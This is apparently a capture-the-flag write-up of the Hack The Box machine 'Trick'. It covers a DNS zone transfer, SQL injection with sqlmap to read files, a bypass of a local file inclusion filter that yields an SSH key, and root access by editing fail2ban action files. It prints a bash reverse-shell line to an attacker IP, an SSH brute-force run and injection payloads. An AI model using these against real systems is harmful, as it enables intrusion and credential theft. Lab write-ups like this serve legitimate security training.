---
title: "Hack The Box: Trick"
date: 2025-11-01
summary: "An Easy Linux-based machine where the target is compromised by performing a DNS zone transfer to discover hidden virtual hosts, followed by SQL injection in a payroll application to read system files. Discovering a marketing web application reveals a bypassable Local File Inclusion vulnerability, enabling extraction of an SSH private key. Privileges are escalated to root by abusing write access over Fail2ban action configuration files to execute arbitrary commands upon triggering a fail2ban ban."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Linux"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Trick"
tags:
  - burp-suite
  - cve-2024-8081
  - cve-2024-8567
  - dig
  - lfi
  - log-poisoning
  - mail-inclusion
  - nmap
  - reverse-shell
  - sql-injection
  - sqlmap
  - ssh-private-key
  - web
  - web-shell
  - zone-transfers
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/trick 10.129.26.43
Nmap scan report for 10.129.26.43
Host is up, received timestamp-reply ttl 63 (0.20s latency).
Scanned at 2025-11-01 09:29:36 +04 for 257s
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=
|   256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
25/tcp open  smtp?   syn-ack ttl 63
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

Services running include SSH, SMTP, DNS, and HTTP.

A good idea is to start enumerating HTTP by visiting the IP in Firefox:

![Figure 1](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Nothing seems interesting.

I tried the following but with no success:

- Fuzzing for hidden pages.
- Exploiting the email address input field for various web attacks.

Since no initial success is associated with HTTP, and as SSH is kept for last, I went for DNS next.

I performed reverse DNS lookup using `dig` to reveal any domain names:

```bash
$ dig @10.129.26.43 -x 10.129.26.43 +short
trick.htb.
```

So there is a hidden vhost: “trick.htb”.

I added it to `/etc/hosts` for the system to be able to resolve it:

```bash
$ echo "10.129.26.43 trick.htb" | sudo tee -a /etc/hosts
```

Now that I know that there is a hidden vhost, I tried performing a zone transfer in an attempt to reveal more DNS data using `dig`:

```bash
$ dig @10.129.26.43 trick.htb AXFR       

; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.129.26.43 trick.htb AXFR
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 192 msec
;; SERVER: 10.129.26.43#53(10.129.26.43) (TCP)
;; WHEN: Sat Nov 01 14:13:18 +04 2025
;; XFR size: 6 records (messages 1, bytes 231)
```

The zone transfer was successful, revealing a new vhost: “preprod-payroll.trick.htb”.

I added it to `/etc/hosts` file:

```bash
$ echo "10.129.26.43 preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
```

As this is a new domain, I visited it to view its contents:

![Figure 2](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

There is a login page belonging to Employee's Payroll Management System (according to the page title).

I tried logging in via the following:

- Exploiting common credentials
- Bypassing authentication

The first method didn’t succeed, while the second method succeeded because of the following:

![Figure 3](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

The authentication seems to be based on AJAX queries, which I simply intercepted and manipulated using Burp Suite which resulted in successful login.

However, logging in resulted in no much useful information.

### SQL Injection

I researched for the platform online for associated vulnerabilities (Payroll Management System vulnerabilities) and found out 2 CVE records referencing SQL injection vulnerabilities: [CVE-2024-8081](https://nvd.nist.gov/vuln/detail/cve-2024-8081) and [CVE-2024-8567](https://nvd.nist.gov/vuln/detail/cve-2024-8567).

As SQL injection seems a promising vulnerability based on the identified CVEs, I tried exploiting it using `sqlmap`.

First, I captured a login request via Burp Suite to feed it to `sqlmap`:

![Figure 4](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

Then I saved it to a file called `req.txt`, and used `sqlmap` on it:

```bash
$ sqlmap -r req.txt           
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9#stable}                                                                                                                                                                                                   
|_ -| . [']     | .'| . |                                                                                                                                                                                                                  
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

<SNIP>

sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 9573 FROM (SELECT(SLEEP(5)))limk) AND 'ZLlD'='ZLlD&password=test
<SNIP>
```

So the website is indeed vulnerable to SQL injection, specifically time-based blind SQLi.

Now that the vulnerability is confirmed, let’s use it to further enumerate the server with higher verbosity. I’ll also exclude time-based SQLi enumeration as it is very slow:

```bash
$ sqlmap -r req.txt --level=5 --risk=3 --threads=10 -a --technique=BEUSQ 
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.9.9#stable}                                                                                                                                                                                                    
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

<SNIP>
[14:43:57] [INFO] fetching current user
[14:43:58] [INFO] retrieved: 'remo@localhost'
current user: 'remo@localhost'
<SNIP>
[14:44:01] [INFO] fetching database users privileges
[14:44:01] [INFO] resumed: ''remo'@'localhost''
[14:44:02] [INFO] retrieved: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
<SNIP>
```

I used `-a` for ultra verbose enumeration.

The thing that stood out mostly is the FILE privilege that the current database user “remo” has. This privilege allows file reading on the database server.

I tired reading the `/etc/passwd` file, and it succeeded:

```bash
$ sqlmap -r req.txt --file-read=/etc/passwd                             
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[(]_____ ___ ___  {1.9.9#stable}                                                                                                                                                                                                    
|_ -| . [']     | .'| . |                                                                                                                                                                                                                   
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

<SNIP>
[14:49:08] [INFO] fetching file: '/etc/passwd'
726F6F743A783A303A303A726F6F743A2F726F6F74<SNIP>
<SNIP>
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)
<SNIP>
```

```bash
$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

So there is a user called “michael” that exists on the server.

Let’s enumerate more interesting files.

As the server is running nginx 1.14.2 (from the `nmap` output above), and there are vhosts running on the HTTP server, let’s read the `/etc/nginx/sites-available/default` file, which is where nginx stores its vhosts’ data:

```bash
$ sqlmap -r req.txt --file-read=/etc/nginx/sites-available/default
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.9.9#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

<SNIP>
[14:56:29] [INFO] fetching file: '/etc/nginx/sites-available/default'
736572766572207B0A096C697374656E20<SNIP>
<SNIP>
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default (same file)
<SNIP>
```

```bash
$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```

Notice how the file reveals a new vhost, "preprod-marketing.trick.htb”.

Let’s add it to `/etc/hosts` file:

```bash
$ echo "10.129.26.43 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
```

Then I visited the site:

![Figure 5](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

It is a marketing website.

Two things stood out initially:

1. The “Contact” page, which likely has some forms that might be injectable.
2. The way how the server fetches its pages: through the `?page=` parameter.

I tried visiting the contact page, which has multiple fields as expected:

![Figure 6](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-7.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

I tried XSS and cookie stealing tricks but they didn’t work.

### LFI

I went to the more interesting identification, which is the `?page` fetching method.

I remember from the [File Inclusion](https://academy.hackthebox.com/module/23/section/1491) module on HTB academy how they abused a very similar scenario with an LFI vulnerability to read system files.

I tried to apply the same concept here, using the `../` trick:

![Figure 7](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-8.png)

<figcaption class="blog-image-caption">Figure 7</figcaption>

The result is an empty page, which suggests that (potentially) some type of filtering is happening.

To know the exact filtering in place, and as we have file read capabilities on the server, I read the `index.php` file in the `/var/www/market` directory, which is the root directory of the marketing site (as identified in the `/etc/nginx/sites-available/default` file above):

```bash
$ sqlmap -r req.txt --file-read=/var/www/market/index.php
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___["]_____ ___ ___  {1.9.9#stable}                                                                                                                                                                                                   
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                  
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

<SNIP>
[15:16:35] [INFO] fetching file: '/var/www/market/index.php'
3C3F7068700D0A2466696C65203D20245<SNIP>
<SNIP>
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php (same file)
<SNIP>
```

```bash
$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>
```

This explains why the `../` trick failed: the server is filtering for `../` patterns and omitting them.

However, there is a huge flaw in this configuration: the server is looking for an **exact match**, which gives us the flexibility of using other LFI tricks such as `....//` (which has the same effects of `../`) without getting filtered out.

![Figure 8](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-9.png)

<figcaption class="blog-image-caption">Figure 8</figcaption>

And the trick indeed works.

From here, there are 3 options to gain RCE:

1. Use mailbox injection to send a malicious mail to the “michael” user through the SMTP service, and put a PHP web shell in it, and use LFI to execute it from the `/var/mail` directory to gain a web shell.
2. Use log poisoning to poison a log file (e.g. `access.log`) with a PHP web shell, and use LFI to execute it to gain a web shell.
3. Search for SSH private keys for the “michael” user and read their values to gain a shell via SSH.

I went with option 3 as it is the easiest and fastest, though I tried option 1 as well and successfully gained a shell via it.

> **Note:** For details about how options 1 and 2 work, check out the 0xdf writeup on the machine:

- [Via mail include](https://0xdf.gitlab.io/2022/10/29/htb-trick.html#shell-via-mail-include)
- [Via log poisoning](https://0xdf.gitlab.io/2022/10/29/htb-trick.html#shell-via-log-poisoning)

So simply I used LFI to look for the `id_rsa` SSH private key in its default location:

![Figure 9](/assets/images/writeups/hack-the-box-trick/hack-the-box-trick-fig-10.png)

<figcaption class="blog-image-caption">Figure 9</figcaption>

And it indeed exists.

So I copied its text, saved it locally and formatted it properly, changed its permissions to 600, and used SSH to gain a shell as the “michael” user, where `user.txt` flag was awaiting:

```bash
$ nano id_rsa
// Paste the key contents here (after formatting it properly)

$ chmod 600 id_rsa

$ ssh michael@trick.htb -i id_rsa
<SNIP>

michael@trick:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos

michael@trick:~$ cat user.txt
2a81fa<REDACTED>
```

Checking out the contents of `sudo -l` reveals the following:

```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

So the current user can restart the `fail2ban` service as root without a password.

Also, as part of privilege escalation enumeration, the current user is identified to be part of the “security” group:

```bash
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

By searching for files and directories that users of the “security” group can access, an interesting output can be seen:

```bash
michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d

michael@trick:~$ ls -ld /etc/fail2ban/action.d
drwxrwx--- 2 root security 4096 Nov  1 13:42 /etc/fail2ban/action.d
```

So the current user has control over the directory that hosts configuration files for the identified `sudo -l` command.

Searching online for ways to abuse such factors to gain root access resulted in the [following article](https://juggernaut-sec.com/fail2ban-lpe/#Enumerating_the_Fail2Ban_Config_Files_and_Exploit_Conditions) by Juggernaut Pentesting Academy.

Basically, what will happen is that under normal circumstances, fail2ban will perform specific actions after certain amount of failed attempts in whatever services that are configured in the `jail.conf` file which, in the case of this machine, has the following configurations:

```bash
michael@trick:/etc/fail2ban$ cat /etc/fail2ban/jail.conf
<SNIP>
#
#

#
#

[sshd]

#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
```

The actions that will be taken are specified in the `/etc/fail2ban/action.d/iptables-multiport.conf` file:

```bash
michael@trick:/etc/fail2ban$ cat /etc/fail2ban/action.d/iptables-multiport.conf
<SNIP>
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
<SNIP>
```

But under certain circumstances, which are met in the current scenario, the `/etc/fail2ban/action.d/iptables-multiport.conf` can be altered to execute malicious actions (e.g. run a reverse shell), and combining it with the `sudo fail2ban restart` command will result in elevated malicious actions.

The `/etc/fail2ban/action.d/iptables-multiport.conf` can’t be directly modified as it is owned by root, where the current user can only read the file:

```bash
michael@trick:/etc/fail2ban$ ls -l /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 root root 1420 Nov  1 14:06 /etc/fail2ban/action.d/iptables-multiport.conf
```

However, as seen previously, the directory that holds the `iptables-multiport.conf` file is modifiable by users in the “security” group, one of which is the current user.

So the trick is to make a copy of the `iptables-multiport.conf` file, edit it, and replace the original file with it:

```bash
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf original

michael@trick:/etc/fail2ban/action.d$ cp original iptables-multiport.conf

michael@trick:/etc/fail2ban/action.d$ chmod 777 iptables-multiport.conf

michael@trick:/etc/fail2ban/action.d$ ls -l iptables-multiport.conf
-rwxrwxrwx 1 michael michael 1420 Nov  1 14:11 iptables-multiport.conf
```

Now the file is under our control.

I will edit the file to execute a reverse shell located in `/tmp` directory that connects to my attacker IP:

```bash
michael@trick:/etc/fail2ban/action.d$ cat /tmp/shell.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.49/4444 0>&1

michael@trick:/etc/fail2ban/action.d$ chmod +x /tmp/shell.sh
```

```bash
michael@trick:/etc/fail2ban/action.d$ nano iptables-multiport.conf

// Edit the "actionban" line to call the shell
actionban = /tmp/shell.sh
```

And finally, let’s restart the fail2ban service with `sudo`:

```bash
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Now to trigger the shell, let’s force ban ourself through brute forcing SSH using any brute forcing tool, such as `crackmapexec`.

But before that, let’s start a `nc` listener to capture the shell:

```bash
$ nc -nvlp 4444
listening on [any] 4444 ...
```

And now let’s ban ourself:

```bash
$ crackmapexec ssh trick.htb -u michael -p /usr/share/wordlists/rockyou.txt
SSH         trick.htb       22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         trick.htb       22     trick.htb        [-] michael:123456 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:12345 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:123456789 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:password Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:iloveyou Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:princess Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:1234567 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:rockyou Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:12345678 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:abc123 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:nicole Authentication failed.
SSH         trick.htb       22     trick.htb        [-] michael:daniel Authentication failed.
<SNIP>
```

After a while, the ban will be triggered, which will execute the shell and connect back to us as root, where `root.txt` will be available:

```bash
listening on [any] 4444 ...
connect to [10.10.14.49] from (UNKNOWN) [10.129.26.43] 60442
bash: cannot set terminal process group (5428): Inappropriate ioctl for device
bash: no job control in this shell

root@trick:/# cd /root
cd /root

root@trick:/root# ls          
ls
f2b.sh
fail2ban
root.txt
set_dns.sh

root@trick:/root# cat root.txt
cat root.txt
9c0fb1<REDACTED>
```
